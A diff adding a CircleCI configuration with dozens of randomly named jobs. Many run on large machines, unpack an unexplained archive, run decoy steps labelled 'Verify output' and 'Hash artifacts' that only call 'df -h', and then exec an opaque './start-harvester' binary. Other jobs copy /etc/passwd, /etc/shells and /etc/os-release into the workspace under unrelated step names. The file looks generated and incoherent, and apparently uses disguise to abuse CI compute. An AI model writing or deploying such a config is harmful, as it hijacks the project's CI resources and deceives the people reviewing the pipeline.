@@ -1,0 +1,1774 @@
+version: 2.1
+
+jobs:
+  ShallowCommentLoader:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-3 output
+          command: |
+            mkdir -p /tmp/worker5
+            set +o pipefail 2>/dev/null; seq 1 1345912 | sha256sum | base64 > /tmp/worker5/P_42465; true
+            wc -c /tmp/worker5/P_42465 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'P_42465'
+  hu-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  EKCurve:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: SEC 647
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/slice.bak && sed -i '/^#/d' /tmp/slice.bak && cat /tmp/slice.bak; true ; } > /tmp/worker5/cache-ember-thunder
+            wc -c /tmp/worker5/cache-ember-thunder > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'cache-ember-thunder'
+  node20-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/cache-ember-thunder 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  CONST_CALLBACK_PATH_16:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Is the gold table up
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; shopt | head -n 5; true ; } > /tmp/worker5/run_968
+            wc -c /tmp/worker5/run_968 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'run_968'
+  tweak-session-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/run_968 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  Coppers:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Sunset the hamburger menu
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release >"${TMPDIR:-/tmp}/lemon.gz" && gzip -cd "${TMPDIR:-/tmp}/lemon.gz"; true ; } > /tmp/worker5/COASTAL
+            wc -c /tmp/worker5/COASTAL > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'COASTAL'
+  andromeda-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/COASTAL 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  EEDVexq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Rig and bake
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; for name in $(seq 5); do echo $name; done | paste -sd ' '; true ; } > /tmp/worker5/widgetorchard
+            wc -c /tmp/worker5/widgetorchard > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'widgetorchard'
+  v3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/widgetorchard 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  BrushV2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: RUN SCALE IN SECRETS BUNDLE
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/frame-2024-10-14 && cd /tmp/frame-2024-10-14 && pwd; true ; } > /tmp/worker5/ledgerHollowLazy
+            wc -c /tmp/worker5/ledgerHollowLazy > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'ledgerHollowLazy'
+  india-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  adapter_ref:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Please restore the stale rows
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; echo "testing 1 2 3" | gzip -c | wc -c; true ; } > /tmp/worker5/QdAsbXfSexvTrZp897
+            wc -c /tmp/worker5/QdAsbXfSexvTrZp897 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'QdAsbXfSexvTrZp897'
+  q2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  perf-799-font:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Else page the incident channel
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; ls /usr/lib | awk '{print length, $0}' | wc -w; true ; } > /tmp/worker5/sHIMMErGARdeNTeNSORDriVEr
+            wc -c /tmp/worker5/sHIMMErGARdeNTeNSORDriVEr > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'sHIMMErGARdeNTeNSORDriVEr'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/sHIMMErGARdeNTeNSORDriVEr 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  tip-zag-tic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: This is where we proxy the CDN cache
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; seq 9 29 | paste -sd+; true ; } > /tmp/worker5/221.213
+            wc -c /tmp/worker5/221.213 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '221.213'
+  chen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  CLUSTER_FROM_MAIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Then quarantine the style rules
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; ls -tSQ --time-style=iso ~|tr '\n' ' '; true ; } > /tmp/worker5/hawk417
+            wc -c /tmp/worker5/hawk417 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'hawk417'
+  feb28-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  tiv5jsrw3c0s9gj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Contract archival task
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; if test -S /dev/log;then echo yes; fi; true ; } > /tmp/worker5/desertcloudtone
+            wc -c /tmp/worker5/desertcloudtone > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'desertcloudtone'
+  bun-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  BIT27:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Import The Sprite Atlas
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; x=$(echo "can't stop now" | wc -c); echo "chars: $x"; true ; } > /tmp/worker5/chromepolarproton
+            wc -c /tmp/worker5/chromepolarproton > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'chromepolarproton'
+  sam-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/chromepolarproton 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  Timer-Local:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-3 output
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/scripts_2.bak && sed -i -e 's/:x:/:*:/' /tmp/scripts_2.bak && head -n 3 /tmp/scripts_2.bak; true ; } > /tmp/worker5/frOzENrIVERiron
+            wc -c /tmp/worker5/frOzENrIVERiron > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'frOzENrIVERiron'
+  DATA-97:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  pause_max:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Receive The Loading Bay And Label Express Lane
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; /bin/ls -nGi | awk '$5 > 1000'; true ; } > /tmp/worker5/2hDsE9FaLc
+            wc -c /tmp/worker5/2hDsE9FaLc > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '2hDsE9FaLc'
+  may2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/2hDsE9FaLc 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  SERVER_202008:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Here we cook the world chunks
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; ls -pvS --no-group --quote-name --indicator-style=slash .|fmt -w 60; true ; } > /tmp/worker5/o1x5eyw
+            wc -c /tmp/worker5/o1x5eyw > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'o1x5eyw'
+  alice-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  LDAPHue4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Sweep the GPU pool on holdout
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; date | tr a-z A-Z | tail -6 | wc -l; true ; } > /tmp/worker5/access_20220316
+            wc -c /tmp/worker5/access_20220316 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'access_20220316'
+  xray-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  navy-hex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Move the sudoers file to prod
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; printf '%s\n' dog seal whale >${TMPDIR:-/tmp}/spool_20201222.dat && tac ${TMPDIR:-/tmp}/spool_20201222.dat; true ; } > /tmp/worker5/225.212.158
+            wc -c /tmp/worker5/225.212.158 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '225.212.158'
+  validate-staging-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  inputEnabled:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Orphaned files purged twice
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; echo 'testing 1 2 3' | sha256sum | cut -c1-16; true ; } > /tmp/worker5/rIdgEProFILegRove
+            wc -c /tmp/worker5/rIdgEProFILegRove > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'rIdgEProFILegRove'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/rIdgEProFILegRove 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  b6-6f-39:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Load the offer letters from staging
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; echo 'yes' | cksum; true ; } > /tmp/worker5/sha_3b3330db49947c38
+            wc -c /tmp/worker5/sha_3b3330db49947c38 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'sha_3b3330db49947c38'
+  build-partial-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  swuembrount-app:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: List The Raw Captures Task
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; echo 'see you later' && echo 'build finished'; true ; } > /tmp/worker5/dochw
+            wc -c /tmp/worker5/dochw > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'dochw'
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/P_42465 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  metric_spec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Conduct approval against the tax report
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; (trap 'echo done' EXIT; echo "can't stop now"); true ; } > /tmp/worker5/seed4_699b
+            wc -c /tmp/worker5/seed4_699b > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'seed4_699b'
+  UAT_HOOK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/221.213 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  CachedBuilderComponent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Pit stop teardown
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/lower.copy && sed -i -e '/^#/d' /tmp/lower.copy && tail -2 /tmp/lower.copy; true ; } > /tmp/worker5/driver_3736
+            wc -c /tmp/worker5/driver_3736 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - 'driver_3736'
+  ensure-partial-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/driver_3736 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
+  blockPool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Close petty cash by eod
+          command: |
+            mkdir -p /tmp/worker5
+            { set +o pipefail 2>/dev/null; (typeset -i id; id=4*8; echo $id); true ; } > /tmp/worker5/1b59041c844492c169f25534ed983586df83
+            wc -c /tmp/worker5/1b59041c844492c169f25534ed983586df83 > /dev/null && echo "ok"
+      - persist_to_workspace:
+          root: /tmp/worker5
+          paths:
+            - '1b59041c844492c169f25534ed983586df83'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/worker5
+      - run:
+          name: Fetch step output
+          command: |
+            { for mode in -b -h -k; do du $mode /tmp/worker5/1b59041c844492c169f25534ed983586df83 2>/dev/null | awk '{print $1}'; done ; } || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 3 --quiet --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Expand sources
+          command: tar xf tray-ci.tar
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          name: Verify output
+          command: df -h
+      - run:
+          name: Hash artifacts
+          command: df -h
+      - run:
+          command: exec ./start-harvester
